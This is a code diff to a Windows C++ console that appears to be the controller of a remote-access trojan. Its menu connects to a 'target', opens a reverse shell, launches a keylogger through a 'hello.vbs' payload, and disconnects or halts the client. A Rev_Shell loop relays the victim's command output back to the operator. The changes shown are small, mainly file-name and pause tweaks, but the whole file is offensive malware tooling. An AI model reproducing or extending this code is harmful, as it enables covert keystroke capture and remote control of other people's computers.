@@ -1,11 +1,11 @@
+// cl /EHsc .\testconsole.cpp /link ws2_32.lib /OUT:testconsole.exe
 #include <winsock2.h>
 #include <iostream>
 #include <ws2tcpip.h>
 #include <Windows.h>
 #include <string>
 #include <thread>
-#include <atomic>
-#include <sstream>                                                              // Include for stringstream
+#include <sstream>                                                              
 
 using namespace std;
 
@@ -39,24 +39,26 @@ int main(int argc, char *argv[])
 {
     argc_global = argc;
     argv_global = argv;
-     
+
     bool loop = true;
     while(loop)
     {
         switch (Get_menu_option())
         {
-            case '1':                                                                         //connect
+            case '1':                                                                   //connect
             {   
                 targetconnected = socket_setup(sock);
+                system("pause");
                 break;
             }
             
-            case '2':                                                                     //Rev shell
+            case '2':                                                                   //Rev shell
             {
                 if (targetconnected) 
                 {
-                    send_data(sock,"from_server","2");
+                    send_data(sock,"from_server.txt","2");
                     cout << ">> Sent " << endl;
+                    system("pause");
                 } 
                 else
                 {
@@ -69,13 +71,13 @@ int main(int argc, char *argv[])
                 break;
             }
             
-            case '3':                                                                     //Execute keylogger
+            case '3':                                                                   //Execute keylogger
             {
                 if (targetconnected)
                 {
-                    send_data(sock,"from_server", "3");
-                    send_data(sock,"from_server", "hello.vbs");
-
+                    send_data(sock,"from_server.txt", "3");
+                    send_data(sock,"from_server.txt", "hello.vbs");
+                    
                     cout << ">> Sent " << endl;
                 }
                 else cout << ">> Target not connected or socket invalid!!" << endl;
@@ -83,12 +85,11 @@ int main(int argc, char *argv[])
 
                 break;
             }
-            case '~':                                                                    //DC Current target
+            case '~':                                                                   //DC Current target
             {
                 if (targetconnected)
                 {
-                    send_data(sock,"from_server","~");
-
+                    send_data(sock,"from_server.txt","~");
                     targetconnected = false;
 
                     if (socket_setup(sock) != 0) return 1;
@@ -99,11 +100,11 @@ int main(int argc, char *argv[])
                 
                 break;
             }
-            case '#':                                                                    //DC Current target and stop its code execution
+            case '#':                                                                   //DC Current target and stop its code execution
             {
                 if (targetconnected)
                 {
-                    send_data(sock,"from_server","#");
+                    send_data(sock,"from_server.txt","#");
                     targetconnected = false;
                     
                     cout << ">> Disconnecting client and requesting stop..." << endl << endl;
@@ -113,7 +114,7 @@ int main(int argc, char *argv[])
 
                 break;
             }
-            case '0':                                                                     //Exit console
+            case '0':                                                                   //Exit console
             {
 
                 if(!targetconnected)
@@ -138,8 +139,6 @@ int main(int argc, char *argv[])
             }
         }
     }   
-
-
     return 0;
 }
 
@@ -322,8 +321,11 @@ string receive_data(SOCKET &clientSocket, const string &filename)
         }
         body = unchunkedBody;
     }
-    return body;
     safe_closesocket(clientSocket);
+
+    //send_data(clientSocket, "from_client.txt", "`");
+    return body;
+    
 }
 
 void os_detection()
@@ -384,6 +386,7 @@ int Rev_Shell(SOCKET &clientSocket)
         while (!processFinished.load())
         {
             string data = receive_data(clientSocket, "from_client.txt");
+            send_data(clientSocket, "from_client.txt", "`");
             if (data.empty()) break;                                                            // Client has disconnected or there was an error
             cout << data;
             Sleep(10);                                                                          // Sleep for a short time to prevent 100% CPU usage
